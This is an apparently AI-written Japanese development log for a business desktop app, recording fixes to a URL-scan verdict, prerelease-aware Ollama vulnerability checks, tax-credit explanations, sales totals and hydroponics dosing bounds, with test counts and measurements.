★ **「誰も調べていない」と「75 台が調べて何も出なかった」が同じ緑の帯**になり、違いは**利用者が安全の合図として読まない `total` の数字だけ**だった。利用者はこの画面に「この URL を開いてよいか」を尋ねに来る。★ **これは異常な応答ではなく、新しい URL の通常の経路である** —— `security/scan-url` は **POST `/urls` で解析を投入してから GET でレポートを読む** (`vtSubmitInit` → `vtReportPath`) ので、VirusTotal がその URL を初めて見たときは解析が待ち行列に入っただけで `last_analysis_stats` は 4 欄とも 0 で返る。★ **パス 261 の網は通り抜ける** —— `vtScanStats` は 4 欄を 1 つずつ要求し、その docblock は「これは『この URL は危険か』という安全の判定なので、数えられなかったことを数え上げてはいけない」と**正しく述べている**。**4 欄とも在って値が 0** はその網を通る —— **欄の欠落と「エンジンが 0 台」は別の状態**で、直した側は前者だけだった。**直し**: ① 判定は `describeScan` **ただ 1 つ**で、`verdict` / `label` / `level` / `note` を**1 つの switch から返す** (パス 386 の `bepDisplay`・パス 402 の `unsafeVersionTexts` と同じ理由) ② **検出の側が先に答える** —— `positives > 0` なら解析したエンジン数に関わらず「検出」(順序を後にすると `1 / 0` を「未解析」と言う) ③ **しきい値も 1 か所** —— 画面は `< 3` / `> 2` をclassName と style の**2 か所に書き写して**いた ④ 未解析の札は「未解析 (0 エンジン)」で、文が「この表示は『安全』を意味しません」と**名指しする** (`role="alert"`)。**正常な応答の答えは 1 つも変わらない** (実測: `0 / 75` は緑のまま・`1 / 75` は warn・`9 / 75` は danger)。検査は `shared/__tests__/scanVerdict.test.ts` (**7 件**) と `renderer/pages/__tests__/scanVerdictOnScreen.test.ts` (**3 件**・jsdom で実際に URL を打って押す。法則 92)。対照 **6 方向すべて鳴る** (A 未解析を「きれい」へ倒す ❌5 (**欠陥がそのまま再現する**) / B 未解析の `level` を `ok` へ ❌4 / C 未解析の札を「0 / 0 エンジン検出」へ戻す ❌1 (**狙った 1 件に当たる**) / D 画面が理由の文を描かない ❌3 / E 画面が判定を無視して常に緑 ❌2 / F 検出より未解析を先に判定 ❌1)。★ **自戒: 対照 C は 1 度目「鳴らなかった」のではなく、当てていなかった** —— `python3 -c "…"` を二重引用符で囲んだので bash が `${s.positives}` を展開しようとして `bad substitution` で止まり、**植え込みが 1 度も起きていなかった**。heredoc で当て直すと狙った 1 件に当たる。**パス 397 / 399 と同じ形で 3 度目**である。★ **もう 1 つ自戒: 検査の見本を手で組んで画面を投げさせた** —— `norton` の欄を想像で書いたので `Cannot read properties of undefined` になった。`SNAPSHOT.security` を spread して`keysConfigured` だけ差し替える形へ直した (**形は見本から借りる**)。**測って何も無かった軸も記録する**: ① 同名の export **38 組**のうち `residentialLandTaxableBase` は**固定資産税 (1/6・1/3) と不動産取得税 (宅地 1/2) の別の税**で、返り値の型も違う (object / number) ので取り違えは型が止める —— 製品の呼び手は 0 件で検査だけが呼ぶ ② **日付・期を綴りの大小で比べる所**を走査したが、`batchSchedule` は前後の判定の下流で `addIsoDays` が `null` を返して fail-closed になり、`docStudioChecks` の `year > month * 12` は労基法36条の正しい検査だった。`typecheck` 緑・`npm test` **823 / 18,189**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15228 → 15238 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 222 ms / heap 10.3 MB・FULL DCL 595 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **11 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 402 後の計測: 11,944,620 B / 3,357,139 B (両方 +1,188 B** —— 順序の規則を持つ `shared/versionOrder.ts` (3 関数) と、原因を 3 つの面へ渡す `unsafeVersionTexts` の分。`shared/` は両ビルドが読むので LITE も同じだけ増える。**利用者の Ollama が `0.1.34-rc1` を名乗ると、critical の RCE が「該当なし」になっていた。** **見つけ方**: パス 400 の法則 `one-subset-per-answer` の残りの手がかり (「漏斗を持つ器の中を 1 つずつ見る」) を辿り、**軸を作り直す filter** (`cashForecast.seasonalIndices` が `history.filter` の後で `i % p` を使い、月の位相がずれる) に着いた —— が、それは**呼び手が 0 件の死んだ export** だった (`salesAnalytics` の同名の関数が正しい形を持ち、`linearTrend` の docblock が「残った点の**元インデックス**を x に使う」と理由まで書いている)。そこで**同名の export** を走査したら **38 組**出て、その 1 つが本命だった。実測 (2026-09-22 ・ 直す前):

| 版 | 該当する勧告 | 黙った物 |
| --- | ---: | --- |
| `0.1.33` | 7 件 | —— |
| **`0.1.34-rc1`** | **6 件** | **CVE-2024-37032 (critical・Probllama の RCE)** |
| **`0.1.46-rc5`** | **2 件** | 2024 年の 4 件 |
| **`0.17.1-rc1`** | **1 件** | **CVE-2026-7482 (CVSS 8.8)** |
| **`0.31.2-rc1`** | `isVersionSafe` = **true** | 画面が「Up to date」 |

★ **台帳 8 件のうち `fixedIn` を持つ 7 件が、`fixedIn + '-rc1'` を名乗るだけで**全部**黙った。** 原因は `compareVersions` の `v.split('-')[0]` で、**プレリリース識別子を捨てていた** (semver §11.3 は 「プレリリースは対応する正式版より前」)。Ollama は `-rc` 付きのリリースを実際に公開しており、`/api/version` はその文字列をそのまま返す。★ **同じアプリが同じ問いに 2 通り答えていた** —— `shared/updateCheck.ts` の `compareVersions` は**正しく**答えており、その docblock は 「必要なのは『x.y.z の大小』と『プレリリースは正式版より古い』の 2 点だけ」と**この規則を名指ししている**。**弱い方が security の側に立っていた** —— どちらが危ない側かは名前からは分からない (法則 `center-then-count-callers` を延長)。★ **既存の検査 2 本が、この欠陥を題名ごと仕様として留めていた** —— `プレリリース/ビルドタグは無視する` (shared) と `ignores -rc / -beta / + build tags (compares numeric prefix only)` (main)。**写しが 2 つ在ったので訂正も 2 回要った** (パス 362 の「訂正は写しの数だけ要る」・法則 `no-weakness-as-spec` を延長)。**直し**: ① 順序の規則は `shared/versionOrder.ts` **ただ 1 つ** (`prereleaseKey` / `splitVersionPrerelease`) で、`updateCheck` の私有の写しを消してそこから読む ② **数の読み方は共有しない** —— `updateCheck` は自分たちのタグを読むので厳格で読めなければ null、`ollama` は第三者が名乗る任意の文字列を読むので読めない成分を 0 に倒して**必ず答えを出す** (不明な版を「安全」と言わないための fail-closed。揃えると片方が必ず緩む —— `loopbackChecks.test.ts` と同じ判断) ③ **原因を選ぶのは 1 か所** (`unsafeVersionCause`) で、順序は `isVersionSafe` と同じ (パス 388 / 401 の形)。パス 264 が同じ画面で分けた「読めない / 古い」に **4 つ目の状態 `prerelease`** が加わる —— `0.31.2-rc1` の利用者は「0.31.2 で修正・0.31.2 以上へ」を読んで**自分は 0.31.2 だと思う**ので、**番号と矛盾する主張には理由が要る** ④ **3 つの面 (札 / 1 行 / 全文) は 1 つの switch から返す** (`unsafeVersionTexts`・パス 386 の `bepDisplay` と同じ理由)。画面はそれを読むので、`version === '' ? … : …` の**写し 2 か所が消えた**。**正常な版の答えは 1 つも変わらない** (実測: `0.31.2` / `0.32.0-rc1` は safe のまま・`''` は `unreadable` のまま)。検査は `shared/__tests__/prereleaseVersionOrder.test.ts` (**14 件**・母集団を台帳から導く) と `renderer/pages/__tests__/ollamaPrereleaseBadge.test.ts` (**4 件**・jsdom で実際に描く。法則 92)。対照 **7 方向すべて鳴る** (A 識別子を捨てる形へ戻す ❌8 (**欠陥がそのまま再現し、当てた 8 件の名前も狙いどおり**) / B `prereleaseKey` の U+FFFF をやめる ❌9 / C 原因を `outdated` へ倒す ❌3 / D 警告文の 1 文を消す ❌2 / E 帯の描画を潰す ❌4 / F 3 つの面を同じ文面に ❌4 / G 規則を逆向きへ ❌9)。★ **ゲートが 3 つ捕まえた**: ① 鎖の**閉包検査** —— 保護対象 `ollama.ts` が新しい `versionOrder.ts` を読むので、**判定が保護の外へ出ていた** (保護対象 88 → **89**・block #252 / #253) ② `lint:mutation-scope` —— 保護対象は変異検査に載せる (`mutate` 296 → **297**) ③ `verify:arch` の live metric 4 件。★ **変異検査の dry run が落ち、原因は私の変更ではなかった** —— `skills.test.ts` の 6 つの describe のうち **1 つだけが `os.homedir()` を差し替えず** `process.env.HOME` に頼っており、全件を 1 度に走らせると `skill "invoice" not found in ~/.claude/skills` で落ちた (単体では 79 件とも緑)。他の 5 つに揃えたら dry run が通り、`versionOrder.ts` は **100.00% (Killed 17 / 生存 0 / 未到達 0)**。★ **自戒: 検査は緑なのに `typecheck` だけが 2 件捕まえた** (`waitForElement` の型引数と第 2 引数の形) —— vitest は型を剥がすので、**パス 373 が記録したのと同じ罠**である。**閉じていない物 (測った)**: ① `versionSafe` は 3 つの生産者が書くのに**画面の読み手が 0 件になった** (原因の判定が `version` から導くため。値は同じだが、今日この欄を読む面は無い) ② `cashForecast.ts` の 8 つの export のうち**アプリが呼ぶのは 2 つだけ**で、月の位相がずれる `seasonalIndices` はその死んだ 6 つの中に在る (罠であって生きた欠陥ではない)。`typecheck` 緑・`npm test` **821 / 18,179**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15208 → 15228 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 198 ms / heap 10.3 MB・FULL DCL 587 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **10 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 401 後の計測: 11,943,432 B / 3,355,951 B (両方 +1,764 B** —— 5 つの原因を言い分ける文とチューザー・札の表・画面の断り 1 つの分。**増分の大半は日本語の文**。**住宅ローン控除の「¥0」は法的結論なのに、理由が 1 文も無かった。** **見つけ方**: パス 400 の法則 `one-subset-per-answer` を**時間軸**へ当て (「ある年の表を別の年の所得に当てていないか」)、`resolveTaxYear` (パス 204) が 6 つの入口すべてを覆っていることを確かめた (**no-find**)。その走査で**年で分岐するもう 1 つの変数** `residenceYear` に着き、`taxCredits.ts` を読んだ。実測 (2026-09-22 ・ 残高 3,000 万): 画面 ③ は `税額控除: 住宅ローン (所得税 ¥0 / 住民税 ¥0)` と刷るだけで、**¥0 の理由をどこにも出していなかった**。ところが ¥0 になる道は **5 つ**あり、**意味も直す手も違う**:

| 原因 | 実測 | 意味 |
| --- | --- | --- |
| 合計所得 > 2,000 万 | `creditable: 0` | その年は対象外 (国税庁 No.1211) |
| 控除期間外 (新竱13年 / 中古10年) | `creditable: 0` | 終わった |
| 2024 年以降の居住 × 省エノ基準非適合 | `balanceCap: 0` → `creditable: 0` | 対象外 (**住宅の性能の事実**) |
| 年末残高 0 | 画面が入力ごと渡さない | 未入力 |
| **差し引く税額が無い** | **`creditable: 210,000` / `unused: 210,000`** | **算定できているが引けない** |

★ **最後の 1 行がいちばん重い** —— アプリは 210,000 円の控除額を*算定してから***全額を `unused` として捨て**、画面には ¥0 だけが出ていた。利用者は「自分には適用されない」と読むが、実際は「控除額は在るが差し引く税額が無い」である。★ **そして画面の但し書きは 5 つのうち 4 つで読み手を誤った方へ導いていた** —— 「居住年・住宅性能区分で控除率/上限が変わります (上のセレクタで選択)」は*セレクタを動かせ*と読めるが、所得制限・期間外・残高未入力・税額不足は**どれもセレクタでは変わらない**。★ **もう 1 つ: 性能区分の札が 2 年について偽だった** —— `<option>` は 5 つの上限を**手で書いて**おり、`その他/非適合` は**どの年でも「〜3,000万」**と名乗っていた (実物は 2024・2025 年の居住で **0**)。**選べる 6 年のうち 2 年について札が偽**で、しかもその 2 年は「利用者が今まさに選ぶ年」である (既定は 2024 年)。**直し**: ① **原因を選ぶのは 1 か所** (`noMortgageCreditCause`) で、**順序は `calcMortgageCredit` の早期 return と同じ**にする —— 別の順序だと「計算が使った理由」と「画面が述べる理由」が食い違う (パス 388 の形) ② 文は原因ごとに別物で、**逃げ口が在るものは名指し、無いものは「居住年・住宅性能区分を変えても適用されません」と言う** ③ **入力は 1 度だけ組む** (同じ器を計算と原因の両方へ渡す) ④ 札は `resolveMortgageParams` から導く (**数を 2 度書かない**)。検査は `renderer/pages/__tests__/mortgageCreditReason.test.ts` (**9 件**) で、背骨は**両方向の不変条件** ——「原因が無い」⟺「画面に出る 2 つの額の合計が 0 でない」。対照 **7 方向すべて鳴り、それぞれ狙った 1 件に当たる**。法則 `blank-states-its-reason` を延長した (**新しい法則は作らない** —— これはその法則の「0 を主張として刷らない」側の、*法的結論*という現れである)。★ **ゲートが私の新しい検査を 2 つ捕まえた**: ① `recordStoreIsolation` (共有の `resetRecordStore()` へ寄せた・パス 384 と同じ) ② `zeroFoldCensus` (`?? 0` が 1 件増えた・280 → **281**。**この枕が読まない引数の埋め**なので正しい 0 で、理由を実物に書いてから再生成した)。**閉じていない物 (測った)**: ① 部分的に引けない場合 (`unused > 0` だが表示額は 0 でない) は断りを出さない ② `residenceYear` に `NaN` を渡すと `resolveMortgageParams` と `mortgagePeriodStatus` が**食い違う**が、画面の入力は選択肢が固定の `<select>` なので**今日 NaN は届かない** (罠であって生きた欠陷ではない)。`typecheck` 緑・`npm test` **819 / 18,159**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15199 → 15208 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 206 ms / heap 10.3 MB・FULL DCL 555 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **9 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 400 後の計測: 11,941,668 B / 3,354,187 B (両方 +1,354 B** —— 断りの日本語の文 3 つと漏斗の配線・`role="alert"` 1 つの分。`renderer/data/` と `renderer/pages/` は両ビルドが読むので LITE も同じだけ増える。**金融機関等提出用の書面 §2 が「2 か月分」と述べながら 50.5 倍の売上高を刷っていた。** `summarizeSales` は**合計を全行から**取りながら `period` だけを `salesPeriod` (= 暦に在る日だけ) で絞っていた —— **同じ器の中に、選別前の分子と選別後の分母が並んでいた**。`kpiActuals.ts` の `readablePeriodRows` が**パス 225** で KPI について直した当の形で、**売上の側だけが残っていた**。実測 (2026-09-22 ・ 100 万 × 2 件 + 日付 `2026-02-31` の 1 件 9,900 万):

| 面 | 値 |
| --- | ---: |
| **書面 §2「売上高（販売記録）」** | **101,000 千円** |
| 受注件数 / 平均受注単価 | **1,019件 / 99,116円** |
| 同じ §2 の但し書き | 「販売記録の**令和8年1月〜令和8年2月・2 か月分**の累計です」 |
| 同じデータの月別合計 (`monthlyTotals`) | **2,000,000** |
| 紙が「読めない行を落とした」と述べるか | **述べない** |

★ **紙の合計が、紙が名乗る月の合計の 50.5 倍**になり、「上記のとおり相違ありません。」と代表者名つきで署名する紙がそれを刷っていた。`2026-02-31` は暦に無い日で、アプリ自身の `isCalendarDate` が読めないと言う値である (復元や古い版の控えで入りうる)。★ **どちらの数も単体では正しい** —— 合計は「入力された全行の和」、期間は「読める日付の範囲」で、**並ぶと嘘になる**のがこの家系の特徴である (だから片方だけを見る検査では映らない)。**見つけ方**: パス 394 が数えた `slice(0, 7)` の母集団を辿って `sales.ts` に着き、`salesPeriod` が `isCalendarDate` で絞る **10 行下**で `summarizeSales` が `entries.reduce` しているのに気付いた。**直し**: ① 漏斗は `summarizeSales` の中の 1 つで、合計・件数・単価・チャネル・期間の**すべて**が同じ部分集合から出る (落とした件数は `SalesSummary.unreadableDates` で返す —— **絞ることと述べることは対**) ② **`hasData` も選別後で測る** —— 素の件数で測ると「`hasData` は true なのに合計は 0」という**理由の無い 0** が紙に出る (パス 395 が閉じた形が別の入口から戻る)。`duplicateOrders` も同じ部分集合から —— 合計に入っていない行を「2 度数えた」と述べるとその文が偽になる ③ **原因を 1 か所で選ぶ** (`blankSalesCause`) —— 「入っていない」と「入っているが読めない」は**別の原因**で直す手も違う (追加 / 消して入れ直し)。混ぜて「未入力」と言うと、記録を入れた利用者に**入れていないと告げる** (パス 388 の売上側) ④ **同じ事実を 2 度言わない** —— §2 の caption は最初から「狭い理由より広い理由を先に述べる」と組まれているので、**足した文でもその不変条件を保つ** ⑤ 画面の文言も実測へ (「**月別の集計**から除いています」は、漏斗が合計にも掛かったので狭すぎる) ⑥ **経営サマリーの画面が述べる** (読み手は 0 件だった)。**直した後の 3 状態** (実測): 0 件 → `―` +「未入力のため」 / 3 件 (1 件読めない) → **2,000 千円** + 「読めない 1 件は集計から除いています」 / 2 件 (全部読めない) → `―` + 「読める記録が 1 件も無いため（2 件を除きました）」 —— **どの状態も理由をちょうど 1 つ言い、しかも正しい方を言う**。検査は `renderer/data/__tests__/salesSubsetParity.test.ts` (**9 件**) で、要点は**母集団を宣言から導く**こと —— `SalesSummary` の宣言を走査して欄名を取り、**「読めない行を 1 件足しても、落とした件数以外は 1 つも動かない」**を全欄に掛ける (欄を並べて当てると 6 つ目の集計欄が足された日に黙る)。`blankReasonMatrix` に `unreadable-sales-dates` の行 (4 面) を足した (**54 件**)。対照 **8 方向のうち 7 方向鳴る**: A `summarizeSales` を全行へ戻す ❌3 (**元の欠陷そのもの**) / C 紙が述べるのをやめる ❌1 / D 画面が述べるのをやめる ❌1 / E `hasData` を素の件数で ❌1 / F 重複を全行から ❌1 / G 原因を常に「未入力」❌1 / H 広い理由が在っても狭い方も言う ❌1。★ **B (`period: salesPeriod(entries)` へ戻す) は鳴らない —— それが等価変異だから**で、`salesPeriod` は中で `isCalendarDate` で絞るので絞った行を渡しても全行を渡しても同じ答えになる (`rows` を渡すのは**読みやすさ**のためで、製品側の注記にそう書いた)。**パス 399 で学んだ区分 (偽の生存 / 等価 / 本物の穴) の「等価」にあたる** —— 1 パス後に同じ区分が役に立った。法則 **96 本目** `one-subset-per-answer` (**分子と分母を同じ部分集合から取る**・出典はパス 225 / 392 / 393 / 400 の 4 件)。`typecheck` 緑・`npm test` **818 / 18,150**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15190 → 15199 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 202 ms / heap 10.3 MB・FULL DCL 561 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (残作業 #74 の忠実な条件の **8 回目**でもあり、今回も再現しなかった))・**2026-09-22 パス 399 後も 11,940,314 B / 3,352,833 B で byte 単位で不変** (直したのは `__tests__/` 2 本と `scripts/` の docblock・`docs/`、それに実物への **pragma 1 つ** だけ —— pragma はコメントなので最小化で落ちる。**両方を組んで実測した**。**変異検査の「本当に生存」が 3 つ目の区分を持っていなかった。** `src/shared/hydroponicsControl.ts` (`stryker.config.json` の `mutate` の外・`mutateScopeCensus` の `measure-next`) を測った —— **67.15% / 覆われた分 68.20%・Killed 652 / Survived 304 / NoCoverage 15 / Timeout 0**・973 変異体・38 分 17 秒。**`mutate` には入れない** —— `thresholds.break = 99.8` を大きく下回るので、入れれば週次 CI が**永続的に赤くなる** (config 自身がそう書いている)。★ **publish 済みの文を 2 つ訂正した**: ① `audit:survivors` の docblock は 2026-09-20 から「1 変異体あたり十数秒」と書いていたが、**それはパス 356 / 357 で測った 3 ファイルの値**だった —— `vitest related` が走らせる範囲は**対象を import する側の連なり**で決まるので、広いファイルでは桁が変わる (実測: **201 ファイル / 2,766 件 / 3 分 02 秒**・生存 321 件を全部当て直すと **≒ 16 時間**)。**だから `--top=N` は飾りではなく、広いファイルでは唯一使える形である。** ② その道具の「本当に生存」は **「どの検査も落ちない」しか意味しない** —— 「観測できるのに誰も主張していない」ではない。標本 10 件のうち **7 件が偽** (既存の検査が殺す) で、残る 3 件 (`:296` の `batchId !== ''` ×2 / `:992` の `overdue` の `late: false`) は**どれも下流で答えが変わらなかった** (実測: `batchId` が `''` / `null` / 未知の `'zzz'` で**`dailyTasks` も `summarize` も JSON が完全一致**・`batchSchedule` を 15 通りの播種・定植日に当てて**予定日が `null` になった回数 0**)。理由は 2 つとも**呼び手の形**に在る: `batchId` の読み手は 2 つとも「`null` なら既定・外れたら同じ既定」へ落ち、`overdue(today, due)` の `due === null` の枕は 4 つの呼び手から届くが**2 つは型で `null` を渡せず** (`BatchSchedule.transplantDue` / `harvestDue` は `string`)、**残り 2 つは `.late` を読む前に `!== null` を再確認する**。つまり区分は 3 つ要る —— **偽の生存** (報告が誤り) / **等価** (理由つきの pragma) / **本物の穴** (検査を書く) 。★★ **ただし「下流で等価」は「殺せない」ではなかった** —— 対照を 5 方向回すと、**`:296` の 2 変異体はこの日書いた検査が全部殺した** (下流では区別できないが、**正規化そのものは `readingFromStored` の返り値として直接主張できる**)。本当に殺せないのは `:992` の 1 件だけで、**順序は「まず宣言の側から主張できないかを試し、それでも観測できない物だけ pragma」**である。検査は `shared/__tests__/hydroponicsEquivalentSurvivors.test.ts` (**6 件**) が等価を支えている不変条件を留める —— いちばん危ないのは「**工程の予定日は常に読める文字列**」で、`transplantDue` / `harvestDue` を `string | null` に広げた日、`if (o.late)` だけの 2 か所が**「定植する —— 定植予定 null を過ぎています」**を出し始める。★ **ついでに古びが 1 つ出た** —— `mutateScopeCensus` の理由の欄は「**1,165 行**の運転管理」と書いていたが実物は **1,390 行** (2026-09 の 6 パスが足した分で、**209 行ずれていた**)。理由の欄は誰も検算しないので、ファイルが伸びても文だけが古びる —— **数は機械が持ち、判断は散文が持つ**形にした (理由の中の `N 行` は実物と一致すること。`LINES` は census が母集団を決めるのに使っているのと同じ 1 つで、末尾の改行を数えるので `wc -l` より 1 大きい)。対照 **8 方向すべて鳴る** (等価の側 5 + 行数の側 3)。★ **自戒: 1 度目の「消す」対照は鳴らなかったが、当てていなかっただけだった** —— `' 行'` を `' 行目あたり'` へ替えたので針は**まだ当たっていた**。「落ちなかった」と「当てていなかった」を混ぜない (パス 397 と同じ形で、**2 パス連続**)。後片付け: 単一ファイルの走査で作られた `.stryker-incremental.json` と `reports/mutation/mutation.json` は**消した** —— config 自身が「古い incremental は偽の生存を作る」と書いており、2026-08 に atlassian.ts で実際に起きている (どちらも gitignore 済み)。`typecheck` 緑・`npm test` **817 / 18,136**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15183 → 15190 へ —— **今回も予想せず門に訊いた**)。**出荷物が 1 byte も動いていないので実機は回していない** (審物を触ったが pragma はコメントで、byte が同じことがその証拠である))・**2026-09-22 パス 398 後の計測: 11,940,314 B / 3,352,833 B (両方 +48 B** —— 調製量の関門に 5 つ目の欄を足し、既存の 4 つの判定を共有の幅の表へ寄せた分。`shared/` は両ビルドが読むので LITE も同じだけ増える。**酸の当量を出す関門が `DosingSetup` の 5 欄のうち 4 つしか検めていなかった。** `acidToNeutralizeAlkalinity` は `tankLiters` / `alkalinityMgCaCO3PerL` / `acidNormality` を「有限で符号が正しいか」で検めるのに、**`residualAlkalinityMgCaCO3PerL` だけは `number` (非 null) なので素で引き算に使っていた**。実測 (直す前・タンク 100 L / アルカリ度 120 / 1 N):

| 残すアルカリ度 | 結果 |
| --- | --- |
| `NaN` | `kind: 'add-acid'` で **`ml` が NaN**・文は「120 → NaN mg-CaCO₃/L」 |
| `-1e9` | `kind: 'add-acid'` で **`ml` = 1,998,401,518 (≒ 2,000 m³ の酸)** |
| `+Infinity` | `'none'` だが文が「残す量 Infinity mg/L 以下です」と刷る |
| `30` (既定) | `ml` = 179.86 |

★ **負が最も重い** —— `remove = alk − res` が大きくなるので **多すぎる酸**を自信のある指示として出す。**これは物理的に手を動かす指示**で、パス 373 が同じファイルについて「打ち間違いがそのまま自信のある間違った答えになる」と書いた当の形である。★ **ただしこれは罠を外したもので、生きた欠陥ではない (測った)** —— 今日この値が壊れて届く道は無い (`parseControlRecord` と `readControlRecord` が両方 `[0, 1000]` に絞る・パス 373)。それでも置くのは、隣の 3 つが「呼び手が検めていないかもしれない」を前提に検めているのに**4 つ目だけがその前提を持たない**という非対称が、次に `DosingSetup` を手で組む呼び手が 1 つ増えた日に静かに開くからである (パス 386 と同じ位置づけ・パス 359 の「入口が出口より厳しい」の裏返し)。**直し**: 幅を**書き写さず**保存側と同じ `CONTROL_FIELD_BOUNDS` を `controlFieldOutOfRange` 経由で読み、同じ寄せを `ecDose` (タンク・上昇率) と `topUpLiters` (タンク) にも掛けた —— そこも `!Number.isFinite(x) || x <= 0` の手書きだった。**正常な入力の答えは 1 つも変わらない** (実測: 既存の 79 件が全部緑・健全な設定で `ml` = 179.86 / `add-stock` / `top-up` のまま)。検査は `shared/__tests__/hydroponicsDoseBounds.test.ts` (**15 件**) が ① 4 つの壊れ方すべてで量を出さず**欄を名指しする** ② **文に `NaN` / `Infinity` を刷らない** ③ EC と補水も同じ幅を通る ④ **母集団の両方向** (`DosingSetup` の数値の欄を*宣言から走査で導いて*どれも関門を通り幅の表に載っている) を留める。対照 **4 方向すべて鳴る**: A 残すアルカリ度の関門を外す ❌5 / B `ecDose` のタンクの幅を外す ❌1 / C 幅の判定を常に false ❌9 / D **6 つ目の数値の欄を足す** ❌4。★ **対照を算術で残した** —— 製品は直したので「2,000 m³」を再現できないので、同じ式を検査の中で組んで桁を示す (`(120 − (−1e9)) / 50.04 × 100` = 1,998,401,519)。`typecheck` 緑・`npm test` **816 / 18,129**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15172 → 15183 へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 206 ms / heap 10.3 MB・FULL DCL 569 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** ——これは #74 の忠実な条件での **7 回目**でもあり、今回も再現しなかった)・**2026-09-22 パス 396 / 397 後も 11,940,266 B / 3,352,785 B で byte 単位で不変** (直したのは `scripts/` と `__tests__/` と `src/shared/ontology/` だけ —— **どれも出荷物に入らない** (オントロジーを読むのは検査と生成 script だけなので tree-shaking で丸ごと落ちる)。両方を組んで実測した。**実機 e2e に 30 秒ちょうどの sleep が 1 件あり、それは「待ち」と書かれていた。** パス 393 の揺れ (`TimeoutError`・連鎖の中で 1 度だけ) は忠実な条件での **4 反復すべてで 再現しなかった** ので、「落ちるのを待つ」のをやめて**待ちごとの 実測 ÷ 制限**を測る道具 (`npm run audit:e2e-wait-margin`・**定期点検の道具 5 本目**) を作った —— 時間切れは「いちばん余裕の無い待ち」から順に起きるので、**どちらに転んでも結論が出る**。★ **母集団を 2 度広げ、広げた回に欠陥が出た** (実測):

| 回 | 包んだ物 | 報告した最大 |
| --- | --- | ---: |
| 1 | `page.waitFor*` の 3 つ | 13.5% |
| 2 | + `page.goto` / `click` / `fill` (この 3 つも自動で待ち、**既定 30 秒**) | 13.5% |
| 3 | **+ Locator の action** | **100.0%** ← 欠陥が出た |

`talent :: waitFor@locator(div)>filter>first` が **30,004 ms / 制限 30,000 ms** ——`page.locator('div').filter({ hasText: /^営業$/ })` は `営業` が `<input>` の**値**であってどの `div` の textContent でもないため**永久に 0 件**で、`.catch(() => {})` が時間切れを飲み、**次の行に主張が無い**ので実体は **30 秒の sleep** だった (FULL と LITE で毎回・連鎖 1 回あたり **60 秒**)。検査が通っていたのは次行の `check()` が自分で待つからで、**通っていた理由が書かれていた理由と違った**。★ **page だけ包むと半分以上が映らない** —— 実測で `.click(` は **135 か所のうち 117 が `page.` 以外** (`.fill(` は 121 / 107) で、ほぼ全部が `page.getByRole(…).click()` / `page.locator(…).first().click()` である。パス 334 / 368 / 369 と同じ家系。**直し**: 法則 `wait-for-condition-not-ticks` のとおり**条件で待つ** (`input[aria-label="申告 1 の部署名"]` の `value` が `営業` になること)。飲み込みもやめた ——**飲んでよいのは直後に絶対の主張が在るときだけ**で、同じファイルの theme の 1 件はその形。実測 talent suite は **36 秒 → 6 秒**・14 件とも通る。★ **#74 の答え**: 再現はしなかった —— 忠実な条件で **6 回** (完走 5 回 + LITE が鮮度の門で断られた 1 回)・**FULL 6 回 / LITE 5 回とも 455 ❌ 0**・ログに `TimeoutError` は 0 件。そのうえで **制限の 50% 以上を使う待ちは直した 1 件を除いて両ビルドとも 0 件** (母集団は待ち **1,146 回 / 種類 697**)。最も薄いのは `shell :: waitForFunction:fn` (**598〜674 ms / 5,000 ms = 12.0〜13.5%**) と `crossTabLock :: click@getByRole(button)` (**1,542〜3,766 ms / 30,000 ms = 5.1〜12.6%** ——実測で 2 倍以上揺れる唯一の待ち)。**個々の待ちが限界に近いという線は消えた**ので、次に同じ形が出たら見るのは起動・ハング・別プロセスとの奪い合いの側である (この 2 つは名前で記録した)。検査は `shared/__tests__/e2eWaitMargin.test.ts` (**17 件**) が① 畳み方の意味 (**最大**を残す・並びは割合) ② **飲み込んだ待ちの両方向の台帳** ③ **記録子の母集団の両方向** (runner が呼ぶ Locator のメソッドは測るか理由つきで免除) を留める。対照 **8 方向すべて鳴る**。★ **自戒 1: 対照 1 つが「鳴らなかった」が、当てていなかっただけだった** —— `sed` の錠を行頭 4 空白の `'boundingBox'` に置いたが実物の行はその前に 2 つ識別子が在り、**置換が 1 度も起きていなかった**。「落ちなかった」と「当てていなかった」を混ぜない。★ **自戒 2: 連鎖が走っている間に `src/` を編集し、鮮度の門が正しく LITE を断った** (`laws.ts` は材料なので `e2e:lite` が exit 2)。**門は正しく、破ったのは私の手順**である。★ **自戒 3: 「その形が無いこと」の主張が自分の注記に当たった** —— 直しの docblock は古い形を**引用して**いるので `codeOnly()` を通し、**その綴りが注記の中には在ること**も標本で留めた (法則 `mention-vs-declaration`)。**測って何も無かった軸も 2 つ記録した**: ① **IPC の境界** —— 引数を取る 10 ハンドラすべてが `unknown` を受けて絞っており (`shellTargetOrNull` は先頭で `typeof !== 'string'` を落とす)、`mainIpc.test.ts` 79 件が `__proto__` / `42` / 非文字列を実際に食わせる。② **パリティ検査 19 本** —— 法則 `parity-is-not-correctness` の機械化案として「絶対の主張が在るか」を測ったが **19 本すべてに在った** ので台帳は作らない(作っても 0 